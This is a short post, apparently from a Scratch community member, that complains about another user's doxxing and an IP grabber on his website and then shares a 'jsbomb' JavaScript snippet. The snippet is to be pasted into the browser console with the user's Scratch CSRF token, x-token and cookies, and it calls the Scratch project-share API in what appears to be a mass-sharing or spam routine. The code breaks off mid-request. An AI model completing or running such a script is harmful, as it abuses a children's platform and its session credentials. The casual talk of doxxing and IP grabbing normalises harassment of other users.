I am more mature than Hexagon, also fuck him because he doxxed me ðŸ–•ðŸ–•ðŸ–• (the difference is he denies doxxing me, but when I doxxed Blue I realized my mistake in just one day and deleted the comment, why does Blue still give me shit about it but denies that Hexagon did anything wrong for... some reason. Hexagon also added an IP grabber to his shitty website despite him already KNOWING MY IP IN THE FIRST PLACE)

Here's some cool JS  code (Credit to @S-Pscripts):

// scratch jsbomb made by derv, not me (TS2021)
// execute the code in console

var e = 1 // id of starting project

var h = 1 // next remix number will be this

var csrf = "insert here" // scratch X-CSRFToken

var xtoken = "insert here" // scratch x-token

var cookies = `` // scratch browser cookies

jsbomb = async function() {

fetch("https://api.scratch.mit.edu/proxy/projects/"+e+"/share", {
